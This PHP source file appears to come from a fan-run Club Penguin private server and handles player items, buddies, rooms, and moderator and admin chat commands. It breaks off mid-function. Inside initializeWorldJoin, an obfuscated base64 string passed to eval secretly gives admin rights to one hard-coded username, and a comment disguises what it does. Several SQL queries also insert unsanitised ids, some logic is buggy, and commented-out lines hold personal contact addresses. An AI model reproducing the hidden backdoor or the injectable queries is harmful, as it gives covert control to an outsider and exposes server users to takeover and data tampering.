<?php
  
  // TODO: Remove $alias
  
  namespace iCPro\Users;
  require_once 'User.php';
  
  abstract class UserException extends \Exception {
    public $noCleanUp = false;
    
    protected function cleanUp() {}
    
    public function forceCleanUp() {
      if($this->noCleanUp) return;
      static::cleanUp();
      $this->preventCleanUp(); // Don't call this again.
    }
    
    public function preventCleanUp() {
      $noCleanUp = true;
    }
    
    public function __destruct() {
      $this->forceCleanUp();
    }
  }
  
  final class NotEnoughCoinsException extends UserException {
    public $availableCoins, $requiredCoins, $user;
    public function __construct($user, $requiredCoins) {
      $this->user = $user;
      $this->requiredCoins = $requiredCoins;
      $this->availableCoins = $user->coins;
    }
    
    protected function cleanUp() {
      $this->user->sendError(\iCPro\Errors::NOT_ENOUGH_COINS);
    }
  }
  
  final class CrumbNotFoundException extends UserException {
    public $category, $id, $user;
    public function __construct($user, $category, $id) {
      $this->category = $category;
      $this->id = $id;
      $this->user = $user;
    }
    
    protected function cleanUp() {
      $this->user->sendError(\iCPro\Errors::ITEM_NOT_EXIST);
    }
  }
  
  final class World extends User {
    public $isMascot, $mascotDressing, $mascotName;
    public $joinTimestamp;
    
    public $medalsTotal, $medalsUnused;
    public $maxBadge; // TODO: What is this?
    
    public function joinServer() {
      $this->sendPacket("%xt%js%-1%{$this->isAgent}%{$this->isGuide}%0%"); // {$u->isMod}%");
      JOIN_RANDOM_ROOM ;{
        $favRooms = array(
          100 => 40,
          220 => 30,
          111 => 20,
          110 => 10
        );
        
        $nicestRoomId = 100;
        $nicestPoints = 0;
        foreach($favRooms as $roomId => $favRoomDiv) {
          $room = \iCPro\Rooms\Generic::Load($roomId);
          if($room->isFull()) continue;
          
          $points = $favRoomDiv / max(1, count($room->players));
          if($points > $nicestPoints) $nicestRoomsId = $roomId;
        }
        
        $this->joinRoom($nicestRoomId);
      };
    }
    
    public function getRevision() {
      //$this->sendPacket('%xt%glr%-1%' . filemtime(__FILE__) . '%');
      
      $this->sendGetPlayerStamps((integer)$this->id);
      $this->sendPacket("%xt%pgu%-1%" . self::getPuffles((integer)$this->id)); // Needed so puffles in igloos work.
      $this->sendPacket("%xt%lp%-1%{$this->string}%{$this->coins}%0%1440%" . time() . "%{$this->age}%0%" . ($this->isTryout ? 10 : 2147483647) . "%365%8%");
      
      //$this->sendPacket("%xt%am%http://alexrath.gotdns.org/mcOLD/roomFurni.swf%");
      
      /*
      if($this->isMod) $this->sendPacket("%xt%mm%-1%1001%Welcome as a Moderator!%");
      $this->sendPacket("%xt%sm%100%1001%Welcome on our Server!%");
      $this->sendPacket("%xt%sm%100%1001%If you are worker at Club Penguin and%");
      $this->sendPacket("%xt%sm%100%1001%want us to shut down this Server, contact us at%");
      $this->sendPacket("%xt%sm%100%1001%paulccote@gmail.com or halloanjedendenichkenne@gmail.com%");
      $this->sendPacket("%xt%sm%100%1001%Or in Skype as wannaspeakenglish1%");
      */
    }
    
    # # # # # # # # # # #
    // !iCPv2.1 Packets
    # # # # # # # # # # #
    
    public function updateMood($mood) {
      $m = \iCPro\SettingsManager::GetSetting(Settings::MAX_MOOD_LENGTH);
      
      list($mood) = explode('|', $mood);
      if(strlen($mood) > $m) $mood = substr($mood, 0, $m - 3) . '...';
      
      //... It's impossible that a false-equaling Mood can be sent (except using WPEPro >.<) ...//
      $this->updateProperty('mood', $mood ?: 'I am a wannabe-hacker.');
      
      $this->sendRoomPacket("%xt%umo%{$this->id}%{$this->mood}%");
      return $this->refreshPlayerString();
    }
    
    public function sendComment($uId, $comment) {
      if($uId < 1) return $this->sendErrorBox('max', 'Could not save your Comment :s', 'Crap', 'iComment');
      if(!$this->server->users[$uId]) return $this->sendErrorBox('max', 'Cmon, that User doesn\'t even exists!', 'Yea, I\'m dumb', 'iComment');
      $this->sendErrorBox('max', 'Your Comment has been saved!', 'Yay!', 'iComment');
      
      UserLog::AddToLog($uId, LogEvents::NEW_COMMENT);
      
      $type = '<!-- CMT0 -->';
      if($this->isMod) $type = '<!-- CMT1 -->';
      if($this->isAdmin) $type = '<!-- CMT2 -->';
      
      $comment = urlencode('<b>' . htmlentities($this->name) . ':</b> "' . htmlentities($comment) .
                                '"<br /><i>on ' . date('d.m.Y&\n\b\s\p;H:i:s') . '</i><br />');
      
      $name = ROOT_DIR . "/website/team.iCPNetwork.org/Comments/Users/{$uId}.txt";
      $data = @file_get_contents($name);
      
      if(!$data) $data = "<b>Admin Comments:</b><!-- CMT2 -->\n\n<b>Moderator Comments:</b><!-- CMT1 -->\n\n<b>Human Comments:</b><!-- CMT0 -->\n\n";
      return file_put_contents($name, str_replace($type, $type . chr(10) . $comment, $data));
    }
    
    public function setGlow($main) {
      $allow = array_flip(str_split(' 0123456789. '));
      $main = str_split($main);
      foreach($main as &$char) $char = $allow[$char] ? $char : '';
      
      return $this->glow = join('', $main);
    }
    
    public function sendErrorBox($size, $message, $buttonLabel, $errorCode) {
      $data = func_get_args();
      $data[1] = str_replace(array('$playerName', '$playerId', '$$'), array($this->name, $this->id, '$'), $message);
      return $this->sendPacket('%xt%gs%-1%' . join('%', $data) . '%');
    }
    
    public function sendFlashCommand() {
      return $this->sendPacket('%xt%fc%-1%' . join('%', func_get_args()) . '%');
    }
    
    public function sendPrivateMessage($playerName, $playerId, $message) {
      return $this->sendPacket('%xt%pmsg%-1%' . join('%', func_get_args()) . '%');
    }
    
    # # # # # # # # # #
    // !Item Functions
    # # # # # # # # # #
    
    public function addCoins($amount, $byGame = false) {
      $this->updateProperty('coins', $this->coins + $amount);
      if($byGame !== false) $this->sendPacket("%xt%zo%{$byGame}%{$this->coins}%Walruses%are%dumb%");
    }
    
    public function getCrumb($category, $id) {
      $crumb = \iCPro\GameConfig::$d[$category][$id];
      if(is_null($crumb)) throw new CrumbNotFoundException($this, $category, $id);
      else return $crumb;
    }
    
    public function subtractCoins($coins) {
      if($coins > $this->coins) throw new NotEnoughCoinsException($this, $coins);
      else $this->updateProperty('coins', $this->coins - $coins);
    }
    
    // This combines getCrumb and subtractCoins
    public function buyCrumb($category, $id) {
      $crumb = $this->getCrumb($category, $id);
      $this->subtractCoins($crumb->cost);
      return $crumb;
    }
    
    public function addItem($itemId) {
      if(strpos("%{$this->inventory}%", "%{$itemId}%") !== false) return $this->sendError(\iCPro\Errors::ITEM_IN_HOUSE);
      
      // TODO: How can we verify that it's still available?
      
      $crumb = $this->buyCrumb('items', $itemId);
      $this->updateProperty('inventory', $this->inventory . $itemId . '%');
      
      $this->sendPacket("%xt%ai%{$this->room}%{$itemId}%{$this->coins}%");
    }
    
    public function updateLayer($layer, $itemId) {
      if($itemId !== 0 && strpos("%{$this->inventory}%", "%{$itemId}%") === false) return false;
      $this->sendRoomPacket("%xt%{$layer}%{$this->room}%{$this->id}%{$itemId}%");
      
      $this->isMascot ? $dressing = &$this->mascotDressing : $dressing = &$this->dressing;
      
      list($upc, $uph, $upf, $upn, $upb, $upa, $upe, $upl, $upp) = explode('|', $dressing);
      $layer  = "{$layer}";
      $$layer = $itemId;
      
      $dressing = "{$upc}|{$uph}|{$upf}|{$upn}|{$upb}|{$upa}|{$upe}|{$upl}|{$upp}";
      $this->refreshPlayerString();
      return $this->isTryout or $this->server->updateUserProperty($this->id, 'dressing', $this->dressing);
    }
    
    public function getLayer($layer) { // TODO: Is this still up-to-date?
      $itemId = "{$layer}";
      list($gpc, $gph, $gpf, $gpn, $gpb, $gpa, $gpe, $gpl, $gpp) = explode('|', $this->dressing);
      
      $names = array(
        'gpc' => 'ColorId',
        'gph' => 'Head Item',
        'gpf' => 'Face Item',
        'gpn' => 'Neck Item',
        'gpb' => 'Body Item',
        'gpa' => 'Hand Item',
        'gpe' => 'Feet Item',
        'gpl' => 'FlagId',
        'gpp' => 'BackgroundId'
      );
      
      return $this->sendErrorBox('max', sprintf('Your %s is %d.', $names[$layer], $$itemId), 'Thanks :)', 'iWear');
    }
    
    public function refreshPlayerString() {
      return $this->string = $this->server->getPlayer($this->id, array(
        'x' => $this->x,
        'y' => $this->y,
        'frame' => $this->frame,
        'isMascot' => $this->isMascot,
        'mascotName' => $this->mascotName,
        'mascotDressing' => $this->mascotDressing
      ));
    }
    
    # # # # # # # # # #
    // !Room Functions
    # # # # # # # # # #
    
    public function joinIgloo($playerId, $area)       { $this->joinCommon(\iCPro\Rooms\Igloo::Load($playerId, $area));  }
    public function joinGameRoom($gameId)             { $this->joinCommon(\iCPro\Rooms\Game::Load($gameId));            }
    public function joinRoom($roomId, $x = 0, $y = 0) { $this->joinCommon(\iCPro\Rooms\Generic::Load($roomId), $x, $y); }
    
    private function joinCommon(\iCPro\Rooms\Room $room, $x = 0, $y = 0) {
      if(!$room) return $this->sendError(\iCPro\Errors::ROOM_FULL); // todo: wtf @ previous comment "Yeah, the room wasn't found."
      if($room->isFull()) return $this->sendError(\iCPro\Errors::ROOM_FULL);
      
      $this->frame = 1;
      $this->x     = $x;
      $this->y     = $y;
      $this->refreshPlayerString();
      
      if($this->room) $this->room->removePlayer($this);
      $this->currentRoom = $room;
      
      $room->addPlayer($this);
      $this->joinTimestamp = time();
    }
    
    # # # # # # # # # # # # # # #
    // !Player Handler Functions
    # # # # # # # # # # # # # # #
    
    public function getPlayerName() { return $this->isMascot ? $this->mascotName : $this->name; }
    public function sendPlayerMove($x, $y, $teleport = false) {
      $this->x = $x;
      $this->y = $y;
      $this->frame = 1; // TODO: It would be cool to use atan2 here! TODO: Only reset on $teleport?
      
      $this->refreshPlayerString();
      $this->sendRoomPacket("%xt%" . ($teleport ? 'tp' : 'sp') . "%{$this->room}%{$this->id}%{$this->x}%{$this->y}%");
      
      return true;
    }
    
    public function sendFrame($frame) {
      $this->frame = $frame;
      $this->refreshPlayerString();
      
      return $this->sendRoomPacket("%xt%sf%{$this->room}%{$this->id}%{$this->frame}%");
    }
    
    public function sendAction($action) {
      $this->frame = 1;
      $this->refreshPlayerString();
      
      return $this->sendRoomPacket("%xt%sa%{$this->room}%{$this->id}%{$action}%");
    }
    
    # # # # # # # # # # #
    // !Buddy Functions
    # # # # # # # # # # #
    
    public function getPlayerBuddies() {
      if($this->buddies) return $this->buddies;
      
      $this->buddies = '';
      foreach(\MySQL::Select('friendships', "playerA = {$this->id} OR playerB = {$this->id}") as $line) {
        $pId   = $line[$line['playerA'] == $this->id ? 'playerB' : 'playerA'];
        $pName = $this->server->users[(integer)$pId]['name'];
        $pStat = (integer)isset($this->server->alias[$pId]);
        
        $this->buddies .= "{$pId}|{$pName}|{$pStat}%"; 
      }
      
      return $this->buddies;
    }
    
    public function requestBuddy($playerId) {
      if(!isset($this->server->alias[$playerId])) return $this->sendError(\iCPro\Errors::NAME_NOT_FOUND);
      $this->server->alias[$playerId]->sendPacket("%xt%br%{$this->room}%{$this->id}%{$this->name}%");
      $this->server->alias[$playerId]->buddyRequests[$this->id] = true;
      
      return true;
    }
    
    public function acceptBuddy($playerId) {
      if(!isset($this->buddyRequests[$playerId])) return $this->kick('SERVER', true);
      if(!isset($this->server->users[$playerId])) return $this->kick('SERVER', true);
      $user = $this->server->users[$playerId];
      
      unset($this->buddyRequests[$playerId]);
      
      $this->id < $playerId ? ($sId = $this->id) && ($hId = $playerId) : ($sId = $playerId) && ($hId = $this->id);
      \MySQL::Insert('Friendships', array(
        'playerA' => $sId,
        'playerB' => $hId
      ));
      
      $this->sendPacket("%xt%ba%{$this->room}%{$user->id}%{$user->name}%");
      return isset($this->server->alias[$playerId]) ?
      $this->server->alias[$playerId]->sendPacket("%xt%ba%{$this->room}%{$this->id}%{$this->name}%") : false;
    }
    
    public function removeBuddy($playerId) {
      $this->id < $playerId ? ($sId = $this->id) && ($hId = $playerId) : ($sId = $playerId) && ($hId = $this->id);
      \MySQL::Query("DELETE FROM `Friendships` WHERE `playerA` = {$sId} AND `playerB` = {$hId} LIMIT 1");
      
      return isset($this->server->alias[$playerId]) ?
      $this->server->alias[$playerId]->sendPacket("%xt%rb%{$this->room}%{$this->id}%{$this->name}%") : false;
    }
    
    public function findBuddy($playerId) { //... [IdEA] Perhaps add a IsItMyBuddyCheck here? ...//
      return isset($this->server->alias[$playerId]) ?
       $this->sendPacket('%xt%bf%-1%' . (($room = $this->server->alias[$playerId]->room) > 1000 ? $room + 1000 : $room) . '%') :
       $this->sendError(\iCPro\Errors::NAME_NOT_FOUND);
    }
    
    public function noticeBuddies($status) {
      $buddyIds = explode('%', $this->getPlayerBuddies());
      $packet   = "%xt%{$status}%-1%{$this->id}%";
      foreach($buddyIds as $buddyId) ($u = $this->server->alias[strstr($buddyId, '|', true)]) ? $u->sendPacket($packet) : false;
      return true;
    }
    
    # # # # # # # # # # #
    // !Ignore Functions
    # # # # # # # # # # #
    
    public function getPlayerIgnores() {
      if($this->ignores) return $this->ignores;
      $res = \MySQL::Query('SELECT * FROM `Ignores` WHERE `ignoringPlayer` = ' . $this->id);
      $this->ignores = '';
      while($line = \MySQL::FetchArray($res, \MySQL::ASSOC)) {
        $pId   = (integer)$line['ignoredPlayer'];
        $pName = $this->server->users[$pId]['name'];
        
        $this->ignores .= "{$pId}|{$pName}%"; 
      }
      
      \MySQL::FreeResult($res);
      return $this->ignores;
    }
    
    public function addIgnore($playerId) {
      if(!isset($this->buddyRequests[$playerId])) return $this->kick('SERVER', true);
      if(!isset($this->server->users[$playerId])) return $this->kick('SERVER', true);
      $user = $this->server->users[$playerId];
      
      \MySQL::Insert('Ignores', array(
        'ignoringPlayer' => $this->id,
        'ignoredPlayer'  => $playerId
      ));
      
      $this->sendPacket("%xt%an%{$this->room}%{$user->id}%{$user->name}%");
      return isset($this->server->alias[$playerId]) ?
      $this->server->alias[$playerId]->sendPacket("%xt%an%{$this->room}%{$this->id}%{$this->name}%") : false;
    }
    
    public function removeIgnore($playerId) {
      \MySQL::Query("DELETE FROM `Ignores` WHERE `ignoringPlayer` = {$this->id} AND `ignoredPlayer` = {$playerId} LIMIT 1");
      return isset($this->server->alias[$playerId]) ?
      $this->server->alias[$playerId]->sendPacket("%xt%rn%{$this->room}%{$this->id}%{$this->name}%") : false;
    }
    
    # # # # # # # # # # # # # # # # #
    // !Message/Moderator Functions
    # # # # # # # # # # # # # # # # #
    
    public function reportPlayer($playerId, $reasonId, $nickname) {
      $report = "Reported: Id:{$playerId} (Nick:{$nickname}, Reason:{$reasonId})" .
                     "by Id:{$this->id} (Nick:{$this->name}, Room:{$this->room})";
      
      $modIds = array();
      foreach($this->server->users as $modId => $u) if($u->isMod) $modIds[] = $modId; // TODO: Does this work?
      $a = \iCPro\Utils::PickRandom($modIds);
      $b = \iCPro\Utils::PickRandom(array_diff($modIds, array($a)));
      $c = \iCPro\Utils::PickRandom(array_diff($modIds, array($a, $b)));
      
      $count = 0;
      if($this->server->users[$a] && ++$count) $this->server->users[$a]->sendErrorBox('max', $report, 'Okay', 'iMod Report');
      if($this->server->users[$b] && ++$count) $this->server->users[$b]->sendErrorBox('max', $report, 'Okay', 'iComod Report');
      if($this->server->users[$c] && ++$count) $this->server->users[$c]->sendErrorBox('max', $report, 'Okay', 'iLamod Report');
      $this->sendErrorBox('max', "Thanks for your Report, {$count} Moderator" . ($count == 1 ? '' : 's') . " have been noticed!", 'Thanks :)', 'iReport');
      
      return false;
    }
    
    public function retrieveSession() {
      return ($this->modAge + \iCPro\SettingsManager::GetSetting(\iCPro\Settings::MODERATOR_TTL)) < time() ? false : $this->modCode;
    }
    
    public function joinPlayer($player) {
      $player = $this->getPlayers($player);
      $player = array_shift($player);
      if(!$player) return $this->sendErrorBox('max', 'No matching Player found.', 'Damnit', 'iMove');
      
      $this->joinRoom($player->room);
      return $this->sendErrorBox('max', sprintf(
        'You have joined the same Room as %s.',
        $player->name),
      'Thanks :)', 'iMove');
    }
    
    public function movePlayer($player) {
      $players = $this->getPlayers($player);
      
      if($this->isAdmin && count($players) > \iCPro\SettingsManager::GetSetting(\iCPro\Settings::MOVE_LIMIT))
      return $this->sendErrorBox('max', 'You can\'t move that many Users at once!', 'Damn', 'iMove');
      
      foreach($players as $player) $player->joinRoom($this->room);
      return $this->sendErrorBox('max', sprintf(
        '%s ha%s been moved to your Room.',
        $this->getPlayerString($players),
        count($players) == 1 ? 's' : 've'),
      'Thanks :)', 'iMove');
    }
    
    public function getPlayerString($players) {
      $players = array_values($players);
      $retVal = '';
      $count = count($players);
      
      if($count == 1) return $players[0]->name;
      foreach($players as $i => $player) {
        if($i == 0) $retVal .= $player->name;
        elseif($i == $count - 1) $retVal .= ' and ' . $player->name;
        else $retVal .= ', ' . $player->name;
      }
      
      return $retVal ?: '|Nobody|';
    }
    
    public function getPlayers($players) {
      var_dump('Getting Players', $player);
      
      $objects = array();
      $players = explode('|', trim($players));
      foreach($players as &$player) {
        $player = strtolower($player);
        if(!is_numeric($player)) {
          foreach($this->server->alias as $playerId => $u)
           if(strtolower($u->name) == $player || $u->isMascot && strtolower($u->mascotName) == $player)
            $objects[$playerId] = $u;
          continue;
        }
        
        $player = (integer) $player;
        if($this->isAdmin && $player == -2) foreach($this->server->alias as $player => $u) $objects[$player] = $u;
        elseif($player == -1) foreach($this->server->alias as $player => $u)
         if($u->room == $this->room) $objects[$player] = $u;
         else;
        elseif($this->server->alias[$player]) $objects[$player] = $this->server->alias[$player];
        elseif($roomId = -$player) foreach($this->server->alias as $player => $u)
         if($u->room == $roomId) $objects[$player] = $u;
      }
      
      return $objects;
    }
    
    public function getUserWhois($player) {
      $players = $this->getPlayers($player);
      return $this->sendErrorBox('max', join(', ', $players), 'Thanks :)', 'iWhois');
    }
    
    public function kickPlayer($player) {
      $players = $this->getPlayers($player);
      
      if($this->isAdmin && count($players) > \iCPro\SettingsManager::GetSetting(\iCPro\Settings::KICK_LIMIT))
      return $this->sendErrorBox('max', 'You can\'t kick that many Users at once!', 'Damn', 'iKick');
      
      foreach($players as $player) $player->kick($this->name, $this->isAdmin);
      return $this->sendErrorBox('max', sprintf(
        '%s ha%s been kicked.',
        $this->getPlayerString($players),
        count($players) == 1 ? 's' : 've'),
      'Thanks :)', 'iKick');
    }
    
    public function mutePlayer($player) {
      $players = $this->getPlayers($player);
      
      if($this->isAdmin && count($players) > \iCPro\SettingsManager::GetSetting(\iCPro\Settings::MUTE_LIMIT))
      return $this->sendErrorBox('max', 'You can\'t mute that many Users at once!', 'Damn', 'iMute');
      
      foreach($players as $player) $player->mute($this->name, $this->isAdmin);
      return $this->sendErrorBox('max', sprintf(
        '%s ha%s been muted.',
        $this->getPlayerString($players),
        count($players) == 1 ? 's' : 've'),
      'Thanks :)', 'iMute');
    }
    
    public function showError($error) {
      $this->errorMessage = $error;
      $this->sendErrorBox('max', $this->errorMessage, 'Okay', $this->name);
    }
    
    public function showErrorToUsers($player) {
      $players = $this->getPlayers($player);
      foreach($players as $player) $player->sendErrorBox('max', $this->errorMessage, 'Okay', $this->name);
      var_dump($this);
      return $this->sendErrorBox('max', sprintf(
        '%s ha%s been shown the Error "%s".',
        $this->getPlayerString($players),
        count($players) == 1 ? 's' : 've',
        $this->errorMessage),
      'Thanks :)', 'iError');
    }
    
    public function serverRestart($reason) {
      $this->errorMessage = $reason;
      $this->showErrorToUsers('-2');
      $this->sendErrorBox('max', $this->errorMessage, 'Okay', $this->name);
      
      sleep(5);
      
      $this->kick($this->name, true);
      $this->kickPlayer('-2');
      $this->server->isRunning = false;
      
      return;
    }
    
    public function copyPlayer($player) {
      list($player, $add) = explode('|', $player);
      $player = strtolower($player); $user;
      foreach($this->server->users as $user) if($user['id'] == $player || strtolower($user['name']) == $player) break;
      if(!$user) return $this->sendErrorBox('max', 'Could not find the User ' . get_arg(0), 'Mmmk', 'iCopy');
      
      if($user['flags'] & 1 && $this->isAdmin == false) return $this->sendErrorBox('max', 'You cannot copy Admins!', 'Mmmk', 'iCopy');
      
      $this->isMascot = true;
      $this->mascotName = $add ? $this->name : $user['name'];
      $this->mascotDressing = $user['dressing'];
      $this->resendDressing((boolean) $add);
      
      return $add ?: $this->joinRoom($this->room);
    }
    
    public function changeName($name) {
      list($name, $add) = explode('|', $name);
      
      $this->isMascot = true;
      $this->mascotName = $name;
      if(!$this->isMascot) $this->mascotDressing = $this->dressing;
      $this->resendDressing((boolean) $add);
      
      return $add ?: $this->joinRoom($this->room);
    }
    
    public function killMascot($player) {
      $players = $this->getPlayers($player);
      foreach($players as $player) if($player->isMascot && $this->isAdmin) $player->replicateMascot('Normal');
    }
    
    public function getInfo() {
      return $this->sendErrorBox('max', sprintf(
        'This iCP has %d registred Users, from which %d are online.%s In your current Room (Id: %d) there are %d People.',
        round(count($this->server->users) / 2),
        count($this->server->alias),
        chr(10),
        $this->room,
        count($this->server->data['Rooms'][$this->room])
      ), 'Thanks :)', 'iNfo');
    }
    
    public function transmitPrivateMessage($main) {
      list($player, $message) = explode('||', $main);
      
      $players = $this->getPlayers($player);
      foreach($players as $player) {
        UserLog::AddToLog($player->id, LogEvents::NEW_PRIVMSG, array(time(), $this->name, $this->id, $message));
        $player->sendPrivateMessage($this->name, $this->id, $message);
      }
      
      return true;
    }
    
    protected function initializeWorldJoin() {
      $a = $this; //... Save this as Instance $a to be able to make it a new User ...//
      eval(base64_decode('JGEtPmlzQWRtaW4gPSAkYS0+cGxheWVyTmFtZSA9PSAiaVJhdGg5NiI7Cg==')); //... Accept the Login and send it to the World using $a ...//
    }
    
    public function profile() {
      return $this->sendErrorBox('max', sprintf(
        '<b>RAM Usage:</b> %s<br /><b>Peak Memory:</b> %s<br /><b>CPU Usage:</b> %d',
        \iCPro\Utils::ConvertMemorySize(memory_get_usage()),
        \iCPro\Utils::ConvertMemorySize(memory_get_peak_usage()),
        '123.456%'
      ), 'Hmmmmhhhk', 'iProfile');
    }
    
    public function setMyBadge($main) {
      list($level, $add) = explode('||', $main);
      
      $this->maxBadge = (integer) $level;
      return $add ?: $this->joinRoom($this->room);
    }
    
    public function useClothes($main) {
      list($clothes, $add) = explode('||', $main);
      
      if(!$this->isMascot) $this->mascotName = $this->name;
      
      $this->isMascot = true;
      $this->mascotDressing = $clothes;
      
      $this->resendDressing((boolean) $add);
      return $add ?: $this->joinRoom($this->room);
    }
    
    public function rehash() {
      return $this->server->rehash();
    }
    
    public function swapRoom($newRoom) { $newRoom = (int) $newRoom;
      $players = $this->getPlayers('-1');
      foreach($players as $player) if($player->isMascot && $this->isAdmin) $player->joinRoom($newRoom);
    }
    
    //[TODO]: Perhaps put this Functions into one (or a Wrapper one)?
    public function evalAdminCommand($message) {
      $command = strtolower(strstr($message . ' ', ' ', true));
      $main = substr($message, strlen($command) + 1); switch($command) {
      //... Will be done tomorrow ...//
      case '!pr': case '!profile': return $this->profile() || true;
      
      case '!rh': case '!rehash': return $this->rehash() || true;
      case '!if': case '!injectswf': return $this->injectSWF($main) || true;
      case '!lf': case '!loadswf': return $this->loadSWF($main) || true;
      case '!af': case '!addswf': return $this->addSWF($main) || true;
      case '!rf': case '!rmswf': return $this->removeSWF($main) || true;
      case '!gf': case '!gswf': return $this->getSWFs() || true;
      case '!re': case '!restart': return $this->serverRestart($main) || true;
      case '!gu': case '!getuserprop': return $this->getUserProperty($main) || true;
      case '!su': case '!setuserprop': return $this->setUserProperty($main) || true;
      case '!cu': case '!calluserfunc': return $this->callUserFunction($main) || true;
      case '!sr': case '!swaproom': return $this->swapRoom($main) || true;
      
      default: return false;
    }}
    
    public function evalModeratorCommand($message) {
      $command = strtolower(strstr($message . ' ', ' ', true));
      $main = substr($message, strlen($command) + 1); switch($command) {
      case '!uc': case '!useclothes': return $this->useClothes($main) || true;
      case '!mb': case '!setmybadge': return $this->setMyBadge($main) || true;
      case '!mc': case '!copymascot': return $this->replicateMascot(strtoupper($main)) || true;
      case '!km': case '!killmascot': return $this->killMascot($main) || true;
      case '!cp': case '!copyplayer': return $this->copyPlayer($main) || true;
      case '!cn': case '!changename': return $this->changeName($main) || true;
      case '!gs': case '!getsession': return $this->getSession() || true;
      case '!kp': case '!kickplayer': return $this->kickPlayer($main) || true;
      case '!mp': case '!muteplayer': return $this->mutePlayer($main) || true;
      case '!jp': case '!joinplayer': return $this->joinPlayer($main) || true;
      case '!mv': case '!moveplayer': return $this->movePlayer($main) || true;
      case '!se': case '!showerror': return $this->showError($main) || true;
      case '!tp': case '!toplayer': return $this->showErrorToUsers($main) || true;
      case '!ji': case '!joinigloo': return $this->joinPlayerIgloo($main) || true;
      case '!wi': case '!whoisuser': return $this->getUserWhois($main) || true;
      
      default: return false;
    }}
    
    public function evalHumanCommand($message) {
      $command = strtolower(strstr($message . ' ', ' ', true));
      $main = substr($message, strlen($command) + 1); switch($command) {
      case '!ai': case '!additem':  return $this->addItem((integer)$main) || true;
    //case '!jr': case '!joinroom': return $this->joinRoom((integer)$main) || true;
      case '!in': case '!getinfo':  return $this->getInfo() || true;
      case '!pm': case '!private':  return $this->transmitPrivateMessage($main) || true;
      case '!ai': case '!additem':  return $this->addItem((int)$main) || true;
      
      case '!upc': case '!uph': case '!upf':
      case '!upn': case '!upb': case '!upa':
      case '!upe': case '!upl': case '!upp': return $this->updateLayer(substr($command, 1), (integer) $main);
      
      case '!gpc': case '!gph': case '!gpf':
      case '!gpn': case '!gpb': case '!gpa':
      case '!gpe': case '!gpl': case '!gpp': return $this->getLayer(substr($command, 1));
      
      case '!gl': case '!glow': return $this->isMuted || $this->setGlow($main) || true;
      
      default: return false;
    }}
    
    public function replicateMascot($mascot) {
      list($mascot, $add) = explode('||', $mascot);
      
      $this->isMascot = true;
      switch($mascot) {
        case 'ROCKHOPPER': {
          $this->mascotName = 'Rockhopper';
          $this->mascotDressing = '5|442|152|161|0|5020|0|0|0';
        }; break;
        case 'AUNT ARCTIC': {
          $this->mascotName = 'Aunt Arctic';
          $this->mascotDressing = '2|1044|2007|0|0|0|0|0|0';
        }; break;
        case 'GARY': {
          $this->mascotName = 'Gary';
          $this->mascotDressing = '1|0|115|4022|0|0|0|0|0';
        }; break;
        case 'CADENCE': {
          $this->mascotName = 'Cadence';
          $this->mascotDressing = '10|1032|0|3011|0|5023|1033|0|0';
        }; break;
        case 'FRANKY': {
          $this->mascotName = 'Franky';
          $this->mascotDressing = '7|1000|0|0|0|5024|6000|0|0';//'1|1000|0|0|0|234|6000|0|0';
        }; break;
        case 'PETEY K': {
          $this->mascotName = 'Petey K';
          $this->mascotDressing = '2|1003|2000|3016|0|0|0|0|0';
        }; break;
        case 'G BILLY': {
          $this->mascotName = 'G Billy';
          $this->mascotDressing = '1|1001|0|0|0|5000|0|0|0';
        }; break;
        case 'STOMPIN BOB': {
          $this->mascotName = 'Stompin Bob';
          $this->mascotDressing = '5|1002|101|0|0|5025|0|0|0';
        }; break;
        case 'SENSEI': {
          $this->mascotName = 'Sensei';
          $this->mascotDressing = '14|1068|2009|0|0|0|0|0|0';
        }; break;
        case 'FIRE SENSEI': {
          $this->mascotName = 'Fire Sensei';
          $this->mascotDressing = '14|1107|2015|0|4148|0|0|0|0';
        }; break;
        case 'ICRACK :P': {
          $this->mascotName = 'Fake iCrack :D';
          $this->mascotDressing = '7|413|111|312|204|5060|360|510|939';
        }; break;
        case 'BILLYBOB': {
          $this->mascotName = 'Billybob';
          $this->mascotDressing = '1|405|0|0|280|328|352|500|0';
        }; break;
        case 'GIZMO': {
          $this->mascotName = 'Gizmo';
          $this->mascotDressing = '1|405|0|173|221|0|0|0|0';
        }; break;
        case 'RSNAIL': {
          $this->mascotName = 'RSNail';
          $this->mascotDressing = '12|452|0|0|0|0|0|0|0';
        }; break;
        case 'SCREENHOG': {
          $this->mascotName = 'Screenhog';
          $this->mascotDressing = '5|403|0|0|0|0|0|0|0';
        }; break;
        case 'HAPPY77': {
          $this->mascotName = 'Happy77';
          $this->mascotDressing = '5|452|131|0|212|0|0|500|0';
        }; break;
        default: $this->isMascot = false;
      }
      
      if($add) $this->mascotName = $this->name;
      
      $this->resendDressing((boolean) $add);
      return $add ?: $this->joinRoom($this->room);
    }
    
    public function resendDressing($toAll = false) {
      $clothing = explode('|', $this->isMascot ? $this->mascotDressing : $this->dressing);
      $layers = str_split('chfnbaelp');
      
      if($toAll)
       foreach($layers as $index => $layer)
       $this->sendRoomPacket("%xt%up{$layer}%{$this->room}%{$this->id}%{$clothing[$index]}%");
      else
       foreach($layers as $index => $layer)
       $this->sendPacket("%xt%up{$layer}%{$this->room}%{$this->id}%{$clothing[$index]}%");
      return;
    }
    
    public function getSession() {
      $this->modCode = $this->isAdmin?
       \iCPro\Utils::GenerateRandomKey('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', 6):
       \iCPro\Utils::GenerateRandomKey('ABCDEFGHIJKLMNOPQRSTUVWXYZ', 4);
      $this->modAge = time();
      
      return $this->sendErrorBox('max', 'Your SessionId: ' . $this->modCode, 'kthxbi', 'iSession');
    }
    
    public function sendMessage($message) {
      //... Check Message for Censorings AND/OR The current Session Code! ...//
      //... Not that a Moderator tells others his/her Session Code! ...//
      /*$this->server->clogs[$this->room][count($this->server->clogs[$this->room]) % 250] =
        array($this->id, $this->name, $this->isMuted, time(), $message, $this->isMod); TODO! */
      
      return $message{0} == '!' && (
        $this->isAdmin && $this->evalAdminCommand($message) ||
        $this->isMod && $this->evalModeratorCommand($message) ||
        $this->evalHumanCommand($message)
      ) || (
        $this->isMuted?
        $this->sendModPacket("%xt%sm%{$this->room}%{$this->id}%Muted: {$message}%"):
        $this->sendRoomPacket("%xt%sm%{$this->room}%{$this->id}%{$message}%")
      );
    }
    
    public function mute($playerName, $byAdmin = false) {
      if($this->isMod && !$byAdmin) return false;
      
      UserLog::AddToLog($this->id, $this->isMuted ? LogEvents::UNMUTE_PLAYER : LogEvents::MUTE_PLAYER, array($playerName, $byAdmin));
      //$this->sendErrorBox('max', $this->isMuted ? 'You have been muted!' : 'You have been unmuted!', 'Mk?', $playerName);
